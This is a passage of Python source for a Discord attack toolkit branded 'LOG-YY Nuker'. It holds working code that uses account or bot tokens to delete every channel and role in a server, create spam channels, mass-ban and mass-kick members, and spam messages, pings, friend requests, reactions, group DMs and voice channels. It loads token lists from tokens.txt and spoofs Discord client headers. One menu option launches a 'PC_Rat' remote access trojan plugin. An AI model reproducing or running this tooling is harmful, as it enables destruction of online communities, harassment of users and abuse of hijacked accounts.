                            print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Sent DM to: {idd}!")
                        continue

                except:
                    print(f'[{Fore.LIGHTRED_EX}>{Fore.RESET}] Token Got Locked')
                    dmspamre()

            dmspamre()



#   ACCOUNT NUKER
    if choice == '7':
        Spinner()
        token = input(f'\n[\x1b[{Fore.GREEN}>>{Fore.WHITE}\x1b[95m\x1B[37m] Token: ')
        validateToken(token)
        Server_Name = str(input(f'[\x1b[95m>>\x1b[95m\x1B[37m] Server Name?: '))
        message_Content = str(input(f'[\x1b[95m>>\x1b[95m\x1B[37m] MassDM Message?: '))
        if threading.active_count() < threads:
            threading.Thread(target=utilities.Plugins.Account_Nuker.GANGNUKER_START, args=(token, Server_Name, message_Content)).start()



#   SERVER NUKER
    if choice == '8':
        Spinner()
        print(f'\n[\x1b[95m1\x1b[95m\x1B[37m] Account Server Nuker')
        print(f'[\x1b[95m2\x1b[95m\x1B[37m] Bot Server Nuker')

        choicee1 = input('\n[\x1b[95m>>\x1b[95m\x1B[37m] Choice?: ')

        if choicee1 == '1':
            token = input('\n[\x1b[95m>>\x1b[95m\x1B[37m] Token: ')
            print(f'[\x1b[95m1\x1b[95m\x1B[37m] Nuker')
            print(f'[\x1b[95m2\x1b[95m\x1B[37m] MassBan/MassKick')
            choicr = input('\n[\x1b[95m>>\x1b[95m\x1B[37m] Choice?: ')


            if choicr == '1':
                server = input(f'[\x1b[95m>>\x1b[95m\x1B[37m] Server ID: ')


                intents = discord.intents.all()
                intents.members = True

                headerrs = {'Authorization': f'{token}',
                            "accept": "*/*",
                            'origin': 'https://discord.com',
                            'sec - fetch - mode': 'cors',
                            "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
                            'sec - fetch - site': 'same - origin',
                            'x - debug - options': 'bugReporterEnabled',
                            'x - super - properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjIwMDAiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTAyMTEzLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ =='
                            }
                client = commands.Bot(command_prefix="!", case_insensitive=False, self_bot=True, intents=intents)

                class UNuker:
                    def DeleteChannels(self, guild, channel):
                        while True:
                            r = requests.delete(f"https://discord.com/api/v9/channels/{channel}", headers=headerrs)
                            if 'retry_after' in r.text:
                                time.sleep(r.json()['retry_after'])
                            else:
                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                                    print(
                                        f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Deleted Channel: {channel}")
                                    break
                                else:
                                    break

                    def DeleteRoles(self, guild, role):
                        while True:
                            r = requests.delete(f"https://discord.com/api/v9/guilds/{guild}/roles/{role}",
                                                headers=headerrs)
                            if 'retry_after' in r.text:
                                time.sleep(r.json()['retry_after'])
                            else:
                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                                    print(
                                        f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Deleted Role: {role}")
                                    break
                                else:
                                    break

                    async def Scrape(self):
                        await client.wait_until_ready()
                        guildOBJ = client.get_guild(int(server))

                        channelcount = 0
                        with open('utilities/QR/channels.txt', 'w') as c:
                            for channel in guildOBJ.channels:
                                c.write(str(channel.id) + "\n")
                                channelcount += 1
                            c.close()

                        rolecount = 0
                        with open('utilities/QR/roles.txt', 'w') as r:
                            for role in guildOBJ.roles:
                                r.write(str(role.id) + "\n")
                                rolecount += 1
                            r.close()

                    def SpamChannels(self, guild, name):
                        while True:
                            json = {'name': name, 'type': 0}
                            r = requests.post(f'https://discord.com/api/v9/guilds/{guild}/channels', headers=headerrs,
                                              json=json)
                            if 'retry_after' in r.text:
                                time.sleep(r.json()['retry_after'])
                            else:
                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                                    print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Created Channel ")
                                    break
                                else:
                                    print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] You Cant Create Channels')

                    def SpamRoles(self, guild, name):
                        while True:
                            json = {'name': name}
                            r = requests.post(f'https://discord.com/api/v9/guilds/{guild}/roles', headers=headerrs,
                                              json=json)
                            if 'retry_after' in r.text:
                                time.sleep(r.json()['retry_after'])
                            else:
                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                                    print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Created Role ")
                                    break
                                else:
                                    print(f'[{Fore.LIGHTRED_EX}-{Fore.RESET}] You Cant Create Roles')
                                    break

                    async def NukeStart(self):
                        chh = input(f"[\x1b[95m>>\x1b[95m\x1B[37m] Channel Name: ")
                        cha = input(f"[\x1b[95m>>\x1b[95m\x1B[37m] Channel Amount: ")
                        rn = input(f"[\x1b[95m>>\x1b[95m\x1B[37m] Roles Name: ")
                        ra = input(f"[\x1b[95m>>\x1b[95m\x1B[37m] Roles Amount: ")

                        channels = open('utilities/QR/channels.txt')
                        roles = open('utilities/QR/roles.txt')

                        for channel in channels:
                            threading.Thread(target=self.DeleteChannels, args=(server, channel,)).start()
                        for role in roles:
                            threading.Thread(target=self.DeleteRoles, args=(server, role,)).start()
                        for i in range(int(cha)):
                            threading.Thread(target=self.SpamChannels, args=(server, chh,)).start()
                        for i in range(int(ra)):
                            threading.Thread(target=self.SpamRoles, args=(server, rn,)).start()

                    async def Menu(self):
                        await self.Scrape()
                        time.sleep(2)
                        await self.NukeStart()
                        time.sleep(2)
                        await self.Menu()

                    @client.event
                    async def on_ready(*Args):
                        await UNuker().Menu()

                    def Check(self):
                        client.run(token, bot=False)

                if __name__ == "__main__":
                    UNuker().Check()

                time.sleep(1)
                exit = input('[\x1b[95m>>\x1b[95m\x1B[37m] Press ENTER : ')
                exit = clear()
                exit = spammer()

            if choicr == '2':
                print(
                    f'{Fore.LIGHTRED_EX}Warning{Fore.RESET} Make Sure Your Account Is Fully Verified Before Using This Command')

                intents = discord.Intents.all()
                intents.members = True

                headerrss = mainHeader(token)
                client = commands.Bot(command_prefix=">", case_insensitive=False, self_bot=True, intents=intents)

                client.remove_command("help")

                class MassBan:

                    def BanMembers(self, guild, member):
                        while True:
                            r = requests.put(f"https://discord.com/api/v9/guilds/{guild}/bans/{member}",
                                             headers=headerrss)
                            if 'retry_after' in r.text:
                                time.sleep(r.json()['retry_after'])
                            else:
                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                                    print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Banning {member}")
                                    break
                                else:
                                    break

                    def KickMembers(self, guild, member):
                        while True:
                            r = requests.delete(f"https://discord.com/api/v9/guilds/{guild}/members/{member}",
                                                headers=headerrss)
                            if 'retry_after' in r.text:
                                time.sleep(r.json()['retry_after'])
                            else:
                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                                    print(f'{Fore.WHITE}[{Fore.GREEN}>>{Fore.WHITE}] Kicking {member}')
                                    break
                                else:
                                    break

                    async def Scrape(self):
                        guild = input(f'[\x1b[95m>>\x1b[95m\x1B[37m] Server ID: ')
                        await client.wait_until_ready()
                        guildOBJ = client.get_guild(int(guild))
                        members = await guildOBJ.chunk()

                        try:
                            os.remove("utilities/QR/members.txt")
                        except:
                            pass

                        membercount = 0
                        with open('utilities/QR/members.txt', 'w') as m:
                            for member in members:
                                m.write(str(member.id) + "\n")
                                membercount += 1
                            print(f"Info: {membercount} Members")
                            m.close()

                    async def BanExecute(self):
                        guild = input(f'[\x1b[95m>>\x1b[95m\x1B[37m] Server ID: ')
                        print()
                        members = open('utilities/QR/members.txt')
                        for member in members:
                            threading.Thread(target=self.BanMembers, args=(guild, member,)).start()
                        members.close()

                    async def KickExecute(self):
                        guild = input(f'[\x1b[95m>>\x1b[95m\x1B[37m] Server ID: ')
                        print()
                        members = open('utilities/QR/members.txt')
                        for member in members:
                            threading.Thread(target=self.KickMembers, args=(guild, member,)).start()
                        members.close()

                    async def Menu(self):
                        print(f'\n[\x1b[95m1\x1b[95m\x1B[37m] MassBan')
                        print(f'[\x1b[95m2\x1b[95m\x1B[37m] MassKick')

                        choice = input(f'[\x1b[95m>>\x1b[95m\x1B[37m] Choice?: ')
                        if choice == '1':
                            await self.Scrape()
                            time.sleep(3)
                            sure = input('[\x1b[95m>>\x1b[95m\x1B[37m] MassBAN y/n?: ').lower()
                            if sure == 'n':
                                await self.BanExecute()
                                time.sleep(2)
                                await self.Menu()

                            if sure == 'n':
                                exit = input('[\x1b[95m>>\x1b[95m\x1B[37m] Press ENTER : ')
                                clear = lambda: os.system('cls')
                                exit = clear()
                                exit = spammer()

                        elif choice == '2':
                            await self.Scrape()
                            time.sleep(3)
                            sure = input('[\x1b[95m>>\x1b[95m\x1B[37m] MassKick y/n?: ').lower()
                            if sure == 'y':
                                await self.KickExecute()
                                time.sleep(2)
                                await self.Menu()
                            if sure == 'n':
                                exit = input('[\x1b[95m>>\x1b[95m\x1B[37m] Press ENTER : ')
                                clear = lambda: os.system('cls')
                                exit = clear()
                                exit = spammer()

                    @client.event
                    async def on_ready(*args):
                        await MassBan().Menu()

                    def Startup(self):
                        try:
                            client.run(token, bot=False)


                        except:
                            print(f'[{Fore.LIGHTRED_EX}-{Fore.RESET}] Invalid Token...')
                            time.sleep(2)
                            exit = input('[\x1b[95m>>\x1b[95m\x1B[37m] Press ENTER : ')
                            exit = clear()
                            exit = spammer()

                if __name__ == "__main__":
                    MassBan().Startup()

                time.sleep(1)
                exit = input('[\x1b[95m>>\x1b[95m\x1B[37m] Press ENTER : ')
                exit = clear()
                exit = spammer()

        if choicee1 == '2':
            TOKEN = input('[\x1b[95m>>\x1b[95m\x1B[37m] Bot Token: ')
            MAX_CHANNELS = 300
            print(f'[{Fore.LIGHTMAGENTA_EX}1{Fore.RESET}] Nuke Server?')
            print(f'[{Fore.LIGHTMAGENTA_EX}2{Fore.RESET}] Server MassBan?')

            choicee = input('\n[\x1b[95m>>\x1b[95m\x1B[37m] Choice?: ')

            if choicee == '1':
                chanless = input('[\x1b[95m>>\x1b[95m\x1B[37m] Spam Channel Name?: ')
                spam = input('[\x1b[95m>>\x1b[95m\x1B[37m] Message?: ')
                print(f'{Fore.LIGHTMAGENTA_EX}Type: !Nuke In Chat To Nuke The Server <3{Fore.RESET}')
                client = commands.Bot(command_prefix="!")

                @client.command()
                async def Nuke(ctx):
                    await ctx.message.delete()
                    guild = ctx.guild

                    for role in guild.roles:
                        try:
                            await role.delete()
                            print(f'{Fore.WHITE}[{Fore.GREEN}>>{Fore.WHITE}] {role.name} Has Been Deleted')
                        except:
                            print(f'[{Fore.LIGHTRED_EX}-{Fore.RESET}] {role.name} Has Not Been Deleted')

                    for channel in guild.channels:
                        try:
                            await channel.delete()
                            print(f'{Fore.WHITE}[{Fore.GREEN}>>{Fore.WHITE}] {channel.name} Has Been Deleted')
                        except:
                            print(f'[{Fore.LIGHTRED_EX}-{Fore.RESET}] You Cant Delete: {channel}')

                    try:
                        for i in range(MAX_CHANNELS):
                            await guild.create_text_channel(chanless)
                            print(f'{Fore.WHITE}[{Fore.GREEN}>>{Fore.WHITE}] {chanless} Has Been Created!')
                    except:
                        print(f'[{Fore.LIGHTRED_EX}>{Fore.RESET}] You havent got permission to create channels')

                @client.event
                async def on_guild_channel_create(channel):
                    while True:
                        try:
                            await channel.send(spam)
                            print(f'{Fore.WHITE}[{Fore.GREEN}>>{Fore.WHITE}] Spamming Server')

                        except:
                            print(f'[{Fore.LIGHTRED_EX}-{Fore.RESET}] Spamming Cancelled')

                def thread():
                    threading.Thread(target=on_guild_channel_create, args=(client.run(TOKEN))).start()

                thread()

                def thread2():
                    threading.Thread(target=Nuke, args=(client.run(TOKEN))).start()

                thread2()

            if choicee == '2':
                print(f'{Fore.WHITE}[{Fore.GREEN}>>{Fore.WHITE}] Type {Fore.LIGHTGREEN_EX}!massban{Fore.RESET} in chat to Massban...')
                headers = {
                    "Authorization":
                        f"Bot {TOKEN}"
                }

                client2 = commands.Bot(
                    command_prefix='!',
                    intents=discord.Intents.all(),
                    help_command=None
                )

                @client2.command()
                async def massban(ctx):
                    await ctx.message.delete()
                    servr = ctx.guild.id

                    def mass_ban(i):
                        sessions = requests.Session()
                        sessions.put(
                            f"https://discord.com/api/v9/guilds/{servr}/bans/{i}",
                            headers=headers
                        )

                    for i in range(3):
                        for member in list(ctx.guild.members):
                            threading.Thread(
                                target=mass_ban,
                                args=(member.id,)
                            ).start()
                    print(f'{Fore.WHITE}[{Fore.GREEN}>>{Fore.WHITE}] Done')

                client2.run(TOKEN)

        time.sleep(5)
        exit = input('[\x1b[95m>>\x1b[95m\x1B[37m] Press ENTER : ')
        exit = clear()
        exit = spammer()



#   SPAMMER
    if choice == '9':
        Spinner()
        print(f"""\n[{Fore.LIGHTRED_EX}!{Fore.RESET}] Make Sure Your Tokens Are In tokens.txt For The Spammer To Work!\n""")
        tokens = open("tokens.txt", "r").read().splitlines()
        server = input(f'[\x1b[95m>>\x1b[95m\x1B[37m] Server ID: ')
        channel = input(f'[\x1b[95m>>\x1b[95m\x1B[37m] Channel ID: ')
        mess = input(f'[\x1b[95m>>\x1b[95m\x1B[37m] Message?: ')
        delay = float(input(f'[\x1b[95m>>\x1b[95m\x1B[37m] Delay: '))
        ch = input('[\x1b[95m>>\x1b[95m\x1B[37m] Random Strings: y/n?: ').lower()
        mas = input('[\x1b[95m>>\x1b[95m\x1B[37m] MassPing?: y/n?: ').lower()

        if mas == 'y':
            with open("tokens.txt") as f:
                firstline = f.readline().rstrip()
            bot = discum.Client(token=firstline)

            def close_after_fetching(resp, guild_id):
                if bot.gateway.finishedMemberFetching(guild_id):
                    lenmembersfetched = len(bot.gateway.session.guild(guild_id).members)
                    print(str(lenmembersfetched) + ' members fetched')
                    bot.gateway.removeCommand(
                        {'function': close_after_fetching, 'params': {'guild_id': guild_id}})
                    bot.gateway.close()

            def get_members(guild_id, channel_id):
                bot.gateway.fetchMembers(guild_id, channel_id, keep='all', wait=1)
                bot.gateway.command(
                    {'function': close_after_fetching, 'params': {'guild_id': guild_id}})
                bot.gateway.run()
                bot.gateway.resetSession()
                return bot.gateway.session.guild(guild_id).members

            members = get_members(server, channel)
            memberslist = []

            for memberID in members:
                memberslist.append(memberID)
                print(memberID)

            f = open('utilities/QR/users.txt', "w")
            for element in memberslist:
                f.write(f'<@{element}>' + '\n')
            f.close()

        def spam(token, mess):
            if mas == 'y':
                with open("utilities/QR/users.txt", "r") as file:
                    allText = file.read()
                    words = list(map(str, allText.split()))
                    mess += ''.join(random.choice(words))

            if ch == 'y':
                mess += " | " + "".join(random.choices(string.ascii_lowercase + string.digits, k=5))

            elif ch == 'n':
                pass

            else:
                pass

            url = 'https://discord.com/api/v9/channels/' + channel + '/messages'
            payload = {"content": mess, "tts": False}
            header = mainHeader(token)

            while True:
                time.sleep(delay)
                src = requests.post(url, headers=header, json=payload)

                if src.status_code == 429:
                    ratelimit = json.loads(src.content)
                    print(f"{Fore.LIGHTRED_EX}[!]{Fore.RESET} Ratelimit for",
                          str(float(ratelimit['retry_after'])) + " seconds")
                    time.sleep(float(ratelimit['retry_after']))

                elif src.status_code == 200:
                    print(f'{Fore.WHITE}[{Fore.GREEN}>>{Fore.WHITE}] Sent: {mess}')

                elif src.status_code == 401:
                    print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] Invalid Token')
                elif src.status_code == 404:
                    print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] Not Found')
                elif src.status_code == 403:
                    print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] Token Doesnt Have Perms For This Channel!')

        def thread():
            text = mess
            for token in tokens:
                threading.Thread(target=spam, args=(token, text)).start()

        start = input(f'\n[\x1b[{Fore.GREEN}>>{Fore.WHITE}\x1b[95m\x1B[37m] Press ENTER To Start: ')
        start = thread()

        time.sleep(2)
        exit = input(f'[\x1b[95m>>\x1b[95m\x1B[37m] Press ENTER : ')
        clear()
        exit = spammer()



#   DM SPAMMER (NEED TO FIX!)
    if choice == '10':
        Spinner()
        gh = input(f"""
DM Spammer is in the Paid Version of LOG-YY Nuker!\nIf You Are Wanting to Purchase Make Sure to Checkout the Offical LOG-YY Nuker Website!

[\x1b[95m1\x1b[95m\x1B[37m] LOG-YY Nuker Website
[\x1b[95m2\x1b[95m\x1B[37m] Exit
  
[\x1b[95m>>\x1b[95m\x1B[37m] Choice?: """)

        if gh in ['01','1']:
            webbrowser.open('https://gangnuker.com')
        elif gh in ['02','2']:
            exit = spammer()
        else:
         print('')



#   FRIEND REQ SPAMMER
    if choice == '11':
        Spinner()
        def friender(token, user):
            try:
                user = user.split("#")
                headers = mainHeader(token)
                payload = {"username": user[0], "discriminator": user[1]}
                src = requests.post('https://discord.com/api/v9/users/@me/relationships', headers=headers,
                                    json=payload)
                if src.status_code == 204:
                    print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Friend Request Sent to {user[0]}#{user[1]}! ")
            except Exception as e:
                print(e)

        user = input(f"\n[\x1b[95m>>\x1b[95m\x1B[37m] Username + Tag: ")
        tokens = open("tokens.txt", "r").read().splitlines()
        delay = float(input(f'\n[\x1b[{Fore.GREEN}>>{Fore.WHITE}\x1b[95m\x1B[37m] Delay: '))
        for token in tokens:
            time.sleep(delay)
            threading.Thread(target=friender, args=(token, user)).start()

        time.sleep(2)
        exit = input(f'[\x1b[95m>>\x1b[95m\x1B[37m] Press ENTER : ')
        exit = clear()
        exit = spammer()



#   HYPESQUAD JOINER
    if choice == '12':
        Spinner()
        print(f'''\n[\x1b[95m1\x1b[95m\x1B[37m] {Fore.MAGENTA}Bravery{Fore.RESET}
[\x1b[95m2\x1b[95m\x1B[37m] {Fore.LIGHTRED_EX}Brilliance{Fore.RESET}
[\x1b[95m3\x1b[95m\x1B[37m] {Fore.LIGHTCYAN_EX}Balance{Fore.RESET}
[\x1b[95m4\x1b[95m\x1B[37m] Leave The HypeSquad''')

        house = input("\n[\x1b[95m>>\x1b[95m\x1B[37m] Choice: ")

        def hype(token):
            headers = mainHeader(token)

            if house == "1":
                housefinal = '1'

            if house == "2":
                housefinal = '2'

            if house == "3":
                housefinal = '3'

            if house == '4':
                housefinal = None

            if house == '1' or '2' or '3':
                payload = {
                    'house_id': housefinal
                }
                rep = requests.post("https://discord.com/api/v9/hypesquad/online", json=payload, headers=headers)
                if rep.status_code == 204:
                    print(f'{Fore.WHITE}[{Fore.GREEN}>>{Fore.WHITE}] Done')
                else:
                    print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] Failed')

            if house == '4':
                payload = {
                    'house_id': housefinal
                }
                req = requests.delete('https://discord.com/api/v9/hypesquad/online', headers=headers, json=payload)
                if req.status_code == 204:
                    print(f'{Fore.WHITE}[{Fore.GREEN}>>{Fore.WHITE}] Done')
                else:
                    pass

            else:
                pass

        tokens = open('tokens.txt', 'r').read().splitlines()
        for token in tokens:
            threading.Thread(target=hype(token)).start()

        time.sleep(1)
        exit = input('[\x1b[95m>>\x1b[95m\x1B[37m] Press ENTER : ')
        exit = clear()
        exit = spammer()



#   REACTION SPAMMER
    if choice == '13':
        Spinner()
        def reaction(chd, iddd, org, token):
            headers = {'Content-Type': 'application/json',
                       'Accept': '*/*',
                       'Accept-Encoding': 'gzip, deflate, br',
                       'Accept-Language': 'en-US',
                       'Cookie': f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                       'DNT': '1',
                       'origin': 'https://discord.com',
                       "sec-fetch-dest": "empty",
                       "sec-fetch-mode": "cors",
                       "sec-fetch-site": "same-origin",
                       'TE': 'Trailers',
                       'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9',
                       'authorization': token,
                       'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
                       }

            emoji = ej.emojize(org, use_aliases=True)
            a = requests.put(
                f"https://discordapp.com/api/v9/channels/{chd}/messages/{iddd}/reactions/{emoji}/@me",
                headers=headers)
            if a.status_code == 204:
                print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Reaction {org}")
            else:
                print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Error")

        tokens = open('tokens.txt', 'r').read().splitlines()
        chd = input('\n[\x1b[95m>>\x1b[95m\x1B[37m] Channel ID ? : ')
        iddd = input('[\x1b[95m>>\x1b[95m\x1B[37m] Message ID ? : ')
        emoji = input('[\x1b[95m>>\x1b[95m\x1B[37m] Emoji ? : ')
        delay = int(input('[\x1b[95m>>\x1b[95m\x1B[37m] Delay ? : '))
        for token in tokens:
            time.sleep(delay)
            threading.Thread(target=reaction, args=(chd, iddd, emoji, token)).start()

        time.sleep(1)
        exit = input(f'\n[\x1b[{Fore.GREEN}>>{Fore.WHITE}\x1b[95m\x1B[37m] Press ENTER : ')
        exit = clear()
        exit = spammer()



#   NICKNAME CHANGER
    if choice == '14':
        Spinner()
        def changenick(server, nickname, token):
            headers = mainHeader(token)

            r = requests.patch(f"https://discord.com/api/v9/guilds/{server}/members/@me/nick", headers=headers,
                               json={"nick": nickname})
            if r.status_code == 200:
                print(f'{Fore.WHITE}[{Fore.GREEN}>>{Fore.WHITE}] Nickname Changed !')
            if r.status_code != 200:
                print(f'[{Fore.LIGHTRED_EX}-{Fore.RESET}] Cant Change Nickname... {Fore.RESET}')

        tokens = open('tokens.txt', 'r').read().splitlines()
        server = input("\n[\x1b[95m>>\x1b[95m\x1B[37m] Server ID: ")
        nick = input("[\x1b[95m>>\x1b[95m\x1B[37m] Nickname?: ")
        for token in tokens:
            threading.Thread(target=changenick, args=(server, nick, token)).start()

        time.sleep(1)
        exit = input('[\x1b[95m>>\x1b[95m\x1B[37m] Press ENTER : ')
        exit = clear()
        exit = spammer()



#   WEBHOOK SPAMMER
    if choice == '15':
        Spinner()
        exec(open('utilities/Plugins/Webhook_Spammer.py').read())



#   VC SPAMMER
    if choice == '16':
        Spinner()
        tokenlist = open(easygui.fileopenbox(), 'r').read().splitlines()
        channel = int(input("\n[\x1b[95m>>\x1b[95m\x1B[37m] Voice Channel ID: "))
        server = int(input("[\x1b[95m>>\x1b[95m\x1B[37m] Server ID: "))
        deaf = input("[\x1b[95m>>\x1b[95m\x1B[37m] Defean: (y/n)? ")
        if deaf == "y":
          deaf = True
          if deaf == "n":
            deaf = False
        mute = input("[\x1b[95m>>\x1b[95m\x1B[37m] Mute: (y/n)? ")
        if mute == "y":
          mute = True
          if mute == "n":
            mute = False
        stream = input("[\x1b[95m>>\x1b[95m\x1B[37m] Stream: (y/n)? ")
        if stream == "y":
          stream = True
          if stream == "n":
            stream = False
        video = input("[\x1b[95m>>\x1b[95m\x1B[37m] Video: (y/n)? ")
        if video == "y":
          video = True
          if video == "n":
            video = False

        executor = ThreadPoolExecutor(max_workers=int(1000))
        def run(token):
          while True:
            ws = WebSocket()
            ws.connect("wss://gateway.discord.gg/?v=8&encoding=json")
            hello = loads(ws.recv())
            heartbeat_interval = hello['d']['heartbeat_interval']
            ws.send(dumps({"op": 2,"d": {"token": token,"properties": {"$os": "windows","$browser": "Discord","$device": "desktop"}}}))
            ws.send(dumps({"op": 4,"d": {"guild_id": server,"channel_id": channel,"self_mute": mute,"self_deaf": deaf, "self_stream?": stream, "self_video": video}}))
            ws.send(dumps({"op": 18,"d": {"type": "guild","guild_id": server,"channel_id": channel,"preferred_region": "singapore"}}))
            ws.send(dumps({"op": 1,"d": None}))
            sleep(0.1)

        i = 0
        for token in tokenlist:
          executor.submit(run, token)
          i+=1
          print("[\x1B[32m>\x1B[32m\x1B[37m] Joined VC")
          sleep(0.01)
        yay = input("\n[\x1b[95m>>\x1b[95m\x1B[37m] Press ENTER to Stop VC Spammer!")



#   PC RAT
    if choice == '17':
        Spinner()
        exec(open('utilities/Plugins/PC_Rat.py').read())


#   ABOUT/ACTIVITY
    if choice == '18':
        Spinner()
        http.client._is_legal_header_name = re.compile(b'[^\\s][^:\\r\\n]*').fullmatch
        print(f'\n[\x1b[95m1\x1b[95m\x1B[37m] About Changer')
        print(f'[\x1b[95m2\x1b[95m\x1B[37m] Activity Status Changer')
        changg = input('\n[\x1b[95m>>\x1b[95m\x1B[37m] Choice: ')
        if changg == '1':

            def abouttt(token, abbb):
                try:
                    headers = secondHeader(token)
                    rd = requests.patch('https://discord.com/api/v9/users/@me', headers=headers, json={'bio': abbb})
                    if rd.status_code == 200:
                        print(f'{Fore.WHITE}[{Fore.GREEN}>>{Fore.WHITE}] Done')
                    else:
                        print(
                            f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Error")

                except:
                    print('Error...')

            tokens = open('tokens.txt', 'r').read().splitlines()
            ab = input('[\x1b[95m>>\x1b[95m\x1B[37m] About: ')
            for token in tokens:
                threading.Thread(target=abouttt, args=(token, ab)).start()

        if changg == '2':
            def activity(token, act):
                ws = websocket.WebSocket()
                actt = 'Online'
                ws.connect('wss://gateway.discord.gg/?v=6&encoding=json')
                gjs = {'name': act,
                       'type': 0}
                auth = {'op': 2,
                        'd': {'token': token,
                              'properties': {'$os': sys.platform,
                                             '$browser': 'RTB',
                                             '$device': f"{sys.platform} Device"},
                              'presence': {'game': gjs,
                                           'status': actt,
                                           'since': 0,
                                           'afk': False}},
                        's': None,
                        't': None}
                ws.send(json.dumps(auth))
                print(f'{Fore.WHITE}[{Fore.GREEN}>>{Fore.WHITE}] Activity Status: {act}')

            tokens = open('tokens.txt', 'r').read().splitlines()
            text = input('[\x1b[95m>>\x1b[95m\x1B[37m] Activity Status: ')
            for token in tokens:
                threading.Thread(target=activity, args=(token, text)).start()

        time.sleep(1)

        time.sleep(1)
        exit = input(f'[\x1b[95m>>\x1b[95m\x1B[37m] Press ENTER : ')
        exit = clear()
        exit = spammer()



#   SERVER LOOKUP
    if choice == '19':
        Spinner()
        exec(open('utilities/Plugins/Server_Lookup.py').read())



#   TOKEN INFORMATION
    if choice == '20':
        Spinner()
        token = input(
        f'\n[\x1b[{Fore.GREEN}>>{Fore.WHITE}\x1b[95m\x1B[37m] Account Token : ')
        validateToken(token)
        utilities.Plugins.Token_Info.Info(token)



#   STATUS CHANGER
    if choice == '21':
        Spinner()
        def ChangeStatus(token, status):
            session = requests.Session()
            headers = {
                'authorization': token,
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.306 Chrome/78.0.3904.130 Electron/7.1.11 Safari/537.36',
                'content-type': 'application/json'
            }
            data = '{"custom_status":{"text":"' + status + '"}}'
            r = session.patch('https://discordapp.com/api/v6/users/@me/settings', headers=headers, data=data)
            print('[\x1B[32m>\x1B[32m] Done ')

        tokens = open('tokens.txt', 'r').read().splitlines()
        status = input('\n[\x1b[95m>>\x1b[95m\x1B[37m] Status?: ')
        for token in tokens:
            threading.Thread(target=ChangeStatus, args=(token, status)).start()

        time.sleep(1)
        exit = input('[\x1b[95m>>\x1b[95m\x1B[37m] Press ENTER : ')
        exit = clear()
        exit = spammer()



#   GROUP SPAMMER
    if choice == '22':
        Spinner()
        token = input('\n[\x1b[95m>>\x1b[95m\x1B[37m] Token: ')
        UserID = input('[\x1b[95m>>\x1b[95m\x1B[37m] User ID: ')
        group = input('[\x1b[95m>>\x1b[95m\x1B[37m] Group Names: ')
        manygr = int(input('[\x1b[95m>>\x1b[95m\x1B[37m] How Many Groups: '))

        headers = mainHeader(token)


        for i in range(manygr):
            try:
                r = requests.post('https://discord.com/api/v9/users/@me/channels', headers=headers,
                                  json={"recipients": []})

                jsr = json.loads(r.content)
                groupID = jsr['id']
                time.sleep(0.5)
                r1 = requests.patch(f'https://discord.com/api/v9/channels/{groupID}', headers=headers,
                                    json={'name': group})
                if r1.status_code == 200:
                    print(f'{Fore.WHITE}[{Fore.GREEN}>>{Fore.WHITE}] Group created')

                with open("utilities/QR/groups.txt", "w") as groupID:
                    groupID.write(jsr['id'] + '\n')

            except:
                print(f'[{Fore.LIGHTRED_EX}-{Fore.RESET}] RateLimited for {jsr["retry_after"]} seconds'), time.sleep(jsr['retry_after'])

            scrIds = random.choice(open('utilities/QR/groups.txt').readlines())
            grID = scrIds.strip('\n')
            r2 = requests.put(f'https://discord.com/api/v9/channels/{grID}/recipients/{UserID}',
                              headers={'Authorization': token})
            if r2.status_code == 204:
                print(f'{Fore.WHITE}[{Fore.GREEN}>>{Fore.WHITE}] Group Members: {UserID}')

        time.sleep(1)
        exit = input('[\x1b[95m>>\x1b[95m\x1B[37m] Press ENTER : ')
        exit = clear()
        exit = spammer()



#   AUTO LOGIN
    if choice == '23':
        Spinner()
        token = input(
            f'\n[\x1b[{Fore.GREEN}>>{Fore.WHITE}\x1b[95m\x1B[37m] Account Token : ')
        validateToken(token)
        utilities.Plugins.Auto_Login.TokenLogin(token)



#   DM DELETER
